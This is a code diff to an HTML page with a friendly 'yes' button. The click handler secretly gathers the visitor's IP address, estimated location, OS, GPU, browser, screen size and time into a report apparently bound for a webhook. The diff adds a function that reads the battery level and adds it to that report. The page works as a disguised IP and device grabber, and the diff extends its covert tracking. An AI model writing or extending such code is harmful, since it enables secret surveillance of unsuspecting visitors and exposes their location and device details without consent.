@@ -123,7 +123,7 @@
             color: #ffffff;
             font-size: 1.4rem;
             font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0,0,0,0.15);
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0, 0, 0, 0.15);
             animation: fadeIn 0.5s ease forwards;
         }
 
@@ -319,6 +319,22 @@
             return { os, browser, hardwareDetail };
         }
 
+        // Retrieves device live battery metrics if supported by mobile web engine
+        async function getBatteryDetails() {
+            let info = "Not Supported";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const percentage = Math.round(battery.level * 100);
+                    const chargingStatus = battery.charging ? "🔌 Charging" : "🔋 Discharging";
+                    info = `${percentage}% (${chargingStatus})`;
+                }
+            } catch (e) {
+                console.error('Battery API access failed:', e);
+            }
+            return info;
+        }
+
         yesBtn.addEventListener('click', async () => {
             interactiveContent.style.display = 'none';
             successMsg.style.display = 'block';
@@ -352,6 +368,7 @@
             }
 
             const cleanDevice = getCleanDeviceInfo();
+            const batteryInfo = await getBatteryDetails();
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const localTime = new Date().toLocaleString();
 
@@ -368,6 +385,7 @@
                         fields: [
                             { name: "🌐 IP Address", value: ipAddress, inline: true },
                             { name: "📍 Estimated Location", value: locationData, inline: true },
+                            { name: "🔋 Battery Level", value: batteryInfo, inline: true },
                             { name: "📱 Operating System", value: cleanDevice.os, inline: true },
                             { name: "🛠️ Hardware/GPU Engine", value: cleanDevice.hardwareDetail, inline: true },
                             { name: "🌐 Web Browser", value: cleanDevice.browser, inline: true },
